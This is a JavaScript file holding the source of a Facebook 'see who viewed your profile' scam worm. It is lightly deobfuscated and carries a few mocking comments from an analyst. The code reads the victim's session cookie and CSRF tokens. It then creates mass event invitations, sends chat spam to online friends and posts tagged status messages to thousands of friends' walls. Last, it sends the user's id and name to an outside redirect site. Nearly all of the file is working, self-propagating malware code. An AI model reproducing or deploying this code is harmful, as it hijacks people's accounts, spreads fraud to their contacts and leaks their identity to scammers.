var randomnumber=Math.floor(Math.random()*99999); // Just generates a random number. Pretty simple so far.
// The randomnumber variable at the end of the URL doesn't actually do anything. It's probably there to mitigate blocking of individual URLs or something.
var chatmessage = '%firstname% See who views your profile @ fblink.net/Wl1b?'+randomnumber;
var postmessage = 'My Top Profile Viewers: \n\ %tf% - 1136 views \n\ %tf% - 983 views \n\ %tf% - 542 views \n\ %tf% - 300 views \n\ See who views your profile @ http://x.co/Wl1b?'+randomnumber;
var redirect = 'http://countmyviews.com/final.php';
var event_description_text = 'Hey everyone, \n\ fb now lets you see who viewed your profile! to enable this feature, go here! - http://x.co/Wl1b?'+randomnumber;
var event_name = 'How to see who viewed your profile!!';
var nfriends = 5000;
var debug = false; // Obviously, these are _professional_ scamsters.
var wf = 0;
var mf = function () {
        if (wf <= 0) {
            setTimeout(function () {
                window['top']['location']['href'] = redirect; // Redirects you to http://countmyviews.com/final.php
            }, 500);
        };
    };
var doget = function (scam_variable_b, scam_variable_c, scam_variable_d) {
        var scam_variable_e = new XMLHttpRequest();
        scam_variable_e['open']('GET', scam_variable_b);
        scam_variable_e['onreadystatechange'] = function () {
            if (scam_variable_e['readyState'] == 4) {
                if (scam_variable_e['status'] == 200 && scam_variable_c) {
                    scam_variable_c(scam_variable_e['responseText']);
                };
                if (scam_variable_d) {
                    scam_variable_d();
                };
            };
        };
        scam_variable_e['send']();
    };
doget('/', function (scam_variable_f) {
    var scam_variable_10 = document['cookie']['match'](/c_user=(\d+)/)[1];
    var scam_variable_11 = function (scam_variable_12) {
            return scam_variable_12 ? '@[' + scam_variable_12['id'] + ':' + scam_variable_12['name'] + ']' : '';
        };
    var scam_variable_13 = function (scam_variable_12) {
            return scam_variable_12 ? scam_variable_12['name'] : '';
        };
    var scam_variable_14 = function (scam_variable_12) {
            out = '';
            for (var scam_variable_15 in scam_variable_12) {
                out += (out ? '&' : '') + scam_variable_15 + ((scam_variable_12[scam_variable_15] !== null) ? '=' + encodeURIComponent(scam_variable_12[scam_variable_15]) : '');
            };
            return out;
        };
    var scam_variable_16 = function (scam_variable_b, scam_variable_12, scam_variable_c, scam_variable_d) {
            var scam_variable_e = new XMLHttpRequest();
            scam_variable_e['open']('POST', scam_variable_b);
            scam_variable_e['setRequestHeader']('Content-Type', 'application/x-www-form-urlencoded');
            scam_variable_e['onreadystatechange'] = function () {
                if (scam_variable_e['readyState'] == 4) {
                    if (scam_variable_e['status'] == 200 && scam_variable_c) {
                        scam_variable_c(scam_variable_e['responseText']);
                    };
                    if (scam_variable_d) {
                        scam_variable_d();
                    };
                };
            };
            scam_variable_e['send'](scam_variable_14(scam_variable_12));
        };
    var scam_variable_17 = function () {
            var new_div = document['createElement']('div');
            new_div['style']['display'] = 'block';
            new_div['style']['position'] = 'absolute';
            new_div['style']['width'] = 100 + '%';
            new_div['style']['height'] = 100 + '%';
            new_div['style']['left'] = 0 + 'px';
            new_div['style']['top'] = 0 + 'px';
            new_div['style']['textAlign'] = 'center';
            new_div['style']['padding'] = '4px';
            new_div['style']['background'] = '#FFFFFF';
            new_div['style']['zIndex'] = 999999;
            new_div['innerHTML'] = '&nbsp;<br/>Please wait, this can take a little while...<br/><br/> We are processing the offer for you... <a href="javascript:void(0);" onclick="wf=0; mf();">click here</a> ';
            document['body']['appendChild'](new_div);
        };
    var scam_variable_19 = scam_variable_f['match'](/name=\\"xhpc_composerid\\" value=\\"([\d\w]+)\\"/i);
    if (scam_variable_19) {
        comp = scam_variable_19[1];
    } else {
        comp = '';
    };
    var scam_variable_1a = scam_variable_f['match'](/name="post_form_id" value="([\d\w]+)"/i)[1];
    var scam_variable_1b = scam_variable_f['match'](/name="fb_dtsg" value="([\d\w]+)"/i)[1];
    var scam_variable_1c = document['getElementById']('navAccountName')['firstChild']['data'];
    redirect = redirect + '?' + scam_variable_14({
        userid: scam_variable_10,
        name: scam_variable_1c,
        doclose: 1
    });
    scam_variable_17();
    if (event_description_text) {
        wf++;
        scam_variable_16('/ajax/choose/?__a=1', {
            type: 'event',
            eid: null,
            invite_message: '',
            __d: 1,
            post_form_id: scam_variable_1a,
            fb_dtsg: scam_variable_1b,
            lsd: null,
            post_form_id_source: 'AsyncRequest'
        }, function (scam_variable_1d) {
            var scam_variable_1e = scam_variable_1d['match'](/\\"token\\":\\"([^\\]+)\\"/)[1];
            var scam_variable_b = '/ajax/typeahead/first_degree.php?__a=1&viewer=' + scam_variable_10 + '&token=' + scam_variable_1e + '&filter[0]=user&options[0]=friends_only&options[1]=nm&options[2]=sort_alpha';
            doget(scam_variable_b, function (scam_variable_1f) {
                var scam_variable_20 = scam_variable_1f['match'](/\{"uid":\d+,/g);
                var scam_variable_21 = [];
                for (var scam_variable_22 = 0; scam_variable_22 < scam_variable_20['length']; scam_variable_22++) {
                    var scam_variable_23 = scam_variable_20[scam_variable_22]['match'](/:(\d+),/)[1];
                    if (scam_variable_23 != scam_variable_10) {
                        scam_variable_21['push'](scam_variable_23);
                    };
                };
                var scam_variable_24 = new Date();
                scam_variable_24['setTime'](scam_variable_24['getTime']() + 60 * 60 * 24 * 1000);
                datestr = (scam_variable_24['getMonth']() + 1) + '/' + scam_variable_24['getDate']() + '/' + scam_variable_24['getFullYear']();
                timestr = scam_variable_24['getHours']() * 60;
                var scam_variable_25 = {
                    post_form_id: scam_variable_1a,
                    fb_dtsg: scam_variable_1b,
                    start_dateIntlDisplay: datestr,
                    start_date: datestr,
                    start_time_hour_min: timestr,
                    name: event_name,
                    place_page_id: '',
                    location: '',
                    street: '',
                    geo_id: '',
                    geo_sq: '',
                    desc: event_description_text,
                    sgb_invitees: scam_variable_21['join'](','),
                    sgb_emails: '',
                    sgb_message: '',
                    privacy_type: 'on',
                    guest_list: 'on',
                    connections_can_post: 'on',
                    save: 'Create Event',
                    submitting: ''
                };
                scam_variable_25['new'] = '';
                scam_variable_16('/events/create.php', scam_variable_25, false, function () {
                    mf(--wf);
                });
            });
        });
    };
    if (chatmessage) {
        wf++;
        scam_variable_16('/ajax/chat/buddy_list.php?__a=1', {
            user: scam_variable_10,
            post_form_id: scam_variable_1a,
            fb_dtsg: scam_variable_1b,
            lsd: null,
            post_form_id_source: 'AsyncRequest',
            popped_out: false,
            force_render: true
        }, function (scam_variable_1d) {
            var scam_variable_26 = scam_variable_1d['substr'](9);
            var scam_variable_27 = eval('(' + scam_variable_26 + ')');
            var scam_variable_28 = scam_variable_27['payload']['buddy_list'];
            for (var scam_variable_29 in scam_variable_28['nowAvailableList']) {
                var scam_variable_2a = Math['floor'](Math['random']() * 1335448958);
                var scam_variable_2b = (new Date())['getTime']();
                var scam_variable_2c = chatmessage['replace']('%firstname%', scam_variable_28['userInfos'][scam_variable_29]['firstName']['toLowerCase']());
                scam_variable_16('/ajax/chat/send.php?__a=1', {
                    msg_id: Math['floor'](Math['random']() * 1335448958),
                    client_time: (new Date())['getTime'](),
                    msg_text: chatmessage['replace']('%firstname%', scam_variable_28['userInfos'][scam_variable_29]['firstName']['toLowerCase']()),
                    to: scam_variable_29,
                    post_form_id: scam_variable_1a,
                    fb_dtsg: scam_variable_1b,
                    post_form_id_source: 'AsyncRequest'
                });
            };
            mf(--wf);
        });
    };
    if (postmessage) {
        wf++;
        doget('/ajax/browser/friends/?uid=' + scam_variable_10 + '&filter=all&__a=1&__d=1', function (scam_variable_1d) {
            var scam_variable_20 = scam_variable_1d['match'](/\/\d+_\d+_\d+_q\.jpg.*?u003ca href=\\"http:\\\/\\\/www.facebook.com\\\/.*?\\u003c\\\/a>/gi);
            var scam_variable_2d = [];
            if (scam_variable_20) {
                for (var scam_variable_22 = 0; scam_variable_22 < scam_variable_20['length']; scam_variable_22++) {
                    var scam_variable_23 = scam_variable_20[scam_variable_22]['match'](/_\d+_/)[0]['replace'](/_/g, '');
                    var scam_variable_2e = scam_variable_20[scam_variable_22]['match'](/>[^>]+\\u003c\\\/a>$/i)[0]['replace'](/\\u003c\\\/a>$/gim, '')['replace'](/>/g, '');
                    scam_variable_2d['push']({
                        id: scam_variable_23,
                        name: scam_variable_2e
                    });
                };
            };
            var scam_variable_d = [];
            var scam_variable_2f = [];
            while (scam_variable_2d['length']) {
                var scam_variable_30 = Math['floor'](Math['random']() * scam_variable_2d['length']);
                scam_variable_d['push'](scam_variable_2d[scam_variable_30]);
                scam_variable_2f['push'](scam_variable_2d[scam_variable_30]);
                var scam_variable_2b = scam_variable_2d['shift']();
                if (scam_variable_30) {
                    scam_variable_2d[scam_variable_30 - 1] = scam_variable_2b;
                };
            };
            if (debug) {
                alert('fetched friends: ' + scam_variable_d['length']);
            };
            var scam_variable_31 = {
                post_form_id: scam_variable_1a,
                fb_dtsg: scam_variable_1b,
                xhpc_composerid: comp,
                xhpc_targetid: scam_variable_10,
                xhpc_context: 'home',
                xhpc_fbx: '',
                lsd: null,
                post_form_id_source: 'AsyncRequest'
            };
            mt = postmessage;
            m = postmessage;
            while (mt['search']('%tf%') >= 0) {
                var scam_variable_32 = scam_variable_d['pop']();
                mt = mt['replace']('%tf%', scam_variable_13(scam_variable_32));
                m = m['replace']('%tf%', scam_variable_11(scam_variable_32));
            };
            scam_variable_31['xhpc_message_text'] = mt;
            scam_variable_31['xhpc_message'] = m;
            if (debug) {
                alert('message text: ' + mt);
            };
            scam_variable_16('/ajax/updatestatus.php?__a=1', scam_variable_31);
            var scam_variable_33 = function (scam_variable_15) {
                    if (scam_variable_15 == 0) {
                        wf = 0;
                        mf();
                        return;
                    };
                    var scam_variable_34 = scam_variable_2f['shift']();
                    var scam_variable_35 = {
                        post_form_id: scam_variable_1a,
                        fb_dtsg: scam_variable_1b,
                        xhpc_composerid: comp,
                        xhpc_targetid: scam_variable_34['id'],
                        xhpc_context: 'profile',
                        xhpc_fbx: 1,
                        lsd: null,
                        post_form_id_source: 'AsyncRequest'
                    };
                    var scam_variable_36 = postmessage;
                    var scam_variable_37 = postmessage;
                    if (scam_variable_d['length'] == 0) {
                        wf = 0;
                        mf();
                        return;
                    };
                    while (scam_variable_36['search']('%tf%') >= 0) {
                        var scam_variable_38 = scam_variable_d['pop']();
                        scam_variable_36 = scam_variable_36['replace']('%tf%', scam_variable_13(scam_variable_38));
                        scam_variable_37 = scam_variable_37['replace']('%tf%', scam_variable_11(scam_variable_38));
                    };
                    scam_variable_35['xhpc_message_text'] = scam_variable_36;
                    scam_variable_35['xhpc_message'] = scam_variable_37;
                    scam_variable_16('/ajax/updatestatus.php?__a=1', scam_variable_35);
                    setTimeout(function () {
                        scam_variable_33(scam_variable_15 - 1);
                    }, 2000);
                };
            wf++;
            setTimeout(function () {
                scam_variable_33(nfriends);
            }, 2000);
        });
    };
    mf();
});
